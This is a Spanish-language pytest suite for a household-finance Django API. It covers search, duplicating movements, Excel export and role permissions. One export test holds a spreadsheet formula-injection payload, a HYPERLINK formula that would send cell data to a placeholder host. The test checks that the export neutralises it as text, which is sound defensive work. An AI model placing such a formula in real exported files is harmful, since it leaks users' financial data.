from datetime import date
from decimal import Decimal
from io import BytesIO

import pytest
from openpyxl import load_workbook

from conftest import CategoriaFactory, CuentaFactory, HogarFactory, MovimientoFactory
from finanzas.models import Movimiento, Presupuesto
from notificaciones.models import Notificacion

pytestmark = pytest.mark.django_db


@pytest.fixture
def escenario(hogar_con_roles):
    hogar, roles = hogar_con_roles
    cuenta = CuentaFactory(hogar=hogar, nombre="Común")
    return hogar, roles, cuenta, CategoriaFactory(hogar=hogar, nombre="Ocio")


def url(hogar, recurso="movimientos"):
    return f"/api/v1/hogares/{hogar.pk}/{recurso}/"


# ── 1. Búsqueda sin acentos ──
@pytest.mark.parametrize("busqueda", ["cafe", "CAFÉ", "Cafe"])
def test_buscar_sin_acentos(cliente, escenario, busqueda):
    hogar, roles, cuenta, _ = escenario
    MovimientoFactory(cuenta=cuenta, concepto="Café Central")
    MovimientoFactory(cuenta=cuenta, concepto="Panadería")
    r = cliente(roles["lector"]).get(url(hogar), {"search": busqueda})
    assert [m["concepto"] for m in r.json()["results"]] == ["Café Central"]


# ── 2. Duplicar ──
def test_duplicar_con_fecha_de_hoy(cliente, escenario):
    hogar, roles, cuenta, ocio = escenario
    original = MovimientoFactory(
        cuenta=cuenta, fecha=date(2026, 1, 3), categoria=ocio, etiquetas=["cine"], origen="extracto", huella="abc"
    )
    r = cliente(roles["miembro"]).post(f"{url(hogar)}{original.pk}/duplicar/")
    assert r.status_code == 201, r.json()
    copia = Movimiento.objects.get(pk=r.json()["id"])
    assert copia.pk != original.pk and copia.fecha == date.today()
    assert (copia.importe, copia.concepto, copia.categoria, copia.etiquetas) == (
        original.importe,
        original.concepto,
        ocio,
        ["cine"],
    )
    assert copia.origen == "manual" and copia.huella == "" and copia.creado_por == roles["miembro"]


@pytest.mark.parametrize("rol, esperado", [("lector", 403), ("ajeno", 404)])
def test_duplicar_permisos(cliente, escenario, rol, esperado):
    hogar, roles, cuenta, _ = escenario
    m = MovimientoFactory(cuenta=cuenta)
    assert cliente(roles[rol]).post(f"{url(hogar)}{m.pk}/duplicar/").status_code == esperado


def test_no_se_duplica_un_movimiento_de_otro_hogar(cliente, escenario):
    hogar, roles, _, _ = escenario
    ajeno = MovimientoFactory()  # otro hogar
    assert cliente(roles["admin"]).post(f"{url(hogar)}{ajeno.pk}/duplicar/").status_code == 404


# ── 3. Exportar a Excel en segundo plano ──
def test_exportar_xlsx(cliente, escenario, django_capture_on_commit_callbacks):
    hogar, roles, cuenta, _ = escenario
    MovimientoFactory(cuenta=cuenta, concepto="Café Central", importe=Decimal("-3.20"), fecha=date(2026, 3, 1))
    MovimientoFactory(cuenta=cuenta, concepto="Café nómina", importe=Decimal("100"))  # ingreso: fuera
    MovimientoFactory(cuenta=cuenta, concepto="Panadería", importe=Decimal("-1"))  # no coincide: fuera
    c = cliente(roles["lector"])

    with django_capture_on_commit_callbacks(execute=True):  # la tarea (eager) y la notificación
        r = c.get(f"{url(hogar)}exportar/", {"formato": "xlsx", "tipo": "gasto", "search": "cafe"})
    assert r.status_code == 202 and r.json() == {"estado": "generando"}

    aviso = Notificacion.objects.get(usuario=roles["lector"], tipo="exportacion_lista")
    assert aviso.hogar == hogar and not Notificacion.objects.exclude(usuario=roles["lector"]).exists()

    r = c.get(f"{url(hogar)}exportaciones/{aviso.datos['archivo']}/")
    assert r.status_code == 200 and r["Content-Disposition"].startswith("attachment")
    hoja = load_workbook(BytesIO(b"".join(r.streaming_content))).active
    filas = list(hoja.iter_rows(values_only=True))
    assert filas[0][:3] == ("Fecha", "Concepto", "Importe")
    assert len(filas) == 2 and filas[1][1] == "Café Central"
    assert filas[1][2] == pytest.approx(-3.2) and filas[1][0].date() == date(2026, 3, 1)  # número y fecha reales

    # Otro hogar no puede descargarla aunque conozca el identificador
    otro = HogarFactory()
    from hogares.models import Membresia

    Membresia.objects.create(hogar=otro, usuario=roles["lector"], rol="admin")
    assert c.get(f"{url(otro)}exportaciones/{aviso.datos['archivo']}/").status_code == 404


def test_exportar_xlsx_sin_formulas(cliente, escenario, django_capture_on_commit_callbacks):
    """El concepto del banco "=HYPERLINK(…)" es una celda de texto, no una fórmula; el importe, un número."""
    hogar, roles, cuenta, _ = escenario
    concepto = '=HYPERLINK("https://ejemplo.test/?d="&A2;"Ver")'
    MovimientoFactory(cuenta=cuenta, concepto=concepto, importe=Decimal("-12.50"), etiquetas=["@casa"])
    c = cliente(roles["lector"])
    with django_capture_on_commit_callbacks(execute=True):
        c.get(f"{url(hogar)}exportar/", {"formato": "xlsx"})
    aviso = Notificacion.objects.get(usuario=roles["lector"], tipo="exportacion_lista")
    r = c.get(f"{url(hogar)}exportaciones/{aviso.datos['archivo']}/")
    concepto_, importe, *_, etiquetas = load_workbook(BytesIO(b"".join(r.streaming_content))).active[2][1:]
    assert (concepto_.value, concepto_.data_type, concepto_.quotePrefix) == (concepto, "s", True)
    assert (etiquetas.value, etiquetas.data_type) == ("@casa", "s")
    assert (importe.value, importe.data_type) == (-12.5, "n")


def test_exportar_valida_antes_de_encolar(cliente, escenario):
    hogar, roles, _, _ = escenario
    c = cliente(roles["lector"])
    assert c.get(f"{url(hogar)}exportar/", {"formato": "pdf"}).status_code == 400
    cuenta_ajena = CuentaFactory()
    r = c.get(f"{url(hogar)}exportar/", {"formato": "xlsx", "cuenta": cuenta_ajena.pk})
    assert r.status_code == 400  # no llega al worker


# ── 4. Matriz de permisos de cuentas y presupuestos ──
ROLES = ["admin", "miembro", "lector", "ajeno"]
ESPERADO = {  # solo los administradores cambian cuentas y presupuestos; los demás miembros los ven
    "get": {"admin": 200, "miembro": 200, "lector": 200, "ajeno": 404},
    "post": {"admin": 201, "miembro": 403, "lector": 403, "ajeno": 404},
    "patch": {"admin": 200, "miembro": 403, "lector": 403, "ajeno": 404},
    "delete": {"admin": 204, "miembro": 403, "lector": 403, "ajeno": 404},
}


@pytest.mark.parametrize("metodo", ESPERADO)
@pytest.mark.parametrize("rol", ROLES)
def test_matriz_cuentas(cliente, escenario, rol, metodo):
    hogar, roles, _, _ = escenario
    c, base = cliente(roles[rol]), url(hogar, "cuentas")
    otra = CuentaFactory(hogar=hogar, nombre="Tarjeta")
    r = {
        "get": lambda: c.get(base),
        "post": lambda: c.post(base, {"nombre": "Nueva", "tipo": "efectivo"}),
        "patch": lambda: c.patch(f"{base}{otra.pk}/", {"nombre": "Visa"}),
        "delete": lambda: c.delete(f"{base}{otra.pk}/"),
    }[metodo]()
    assert r.status_code == ESPERADO[metodo][rol], getattr(r, "data", None)


@pytest.mark.parametrize("metodo", ESPERADO)
@pytest.mark.parametrize("rol", ROLES)
def test_matriz_presupuestos(cliente, escenario, rol, metodo):
    hogar, roles, _, ocio = escenario
    c, base = cliente(roles[rol]), url(hogar, "presupuestos")
    p = Presupuesto.objects.create(hogar=hogar, categoria=ocio, mes=date(2026, 1, 1), importe=Decimal("100"))
    r = {
        "get": lambda: c.get(base),
        "post": lambda: c.post(base, {"categoria": ocio.pk, "mes": "2026-02-01", "importe": "50"}),
        "patch": lambda: c.patch(f"{base}{p.pk}/", {"importe": "80"}),
        "delete": lambda: c.delete(f"{base}{p.pk}/"),
    }[metodo]()
    assert r.status_code == ESPERADO[metodo][rol], getattr(r, "data", None)
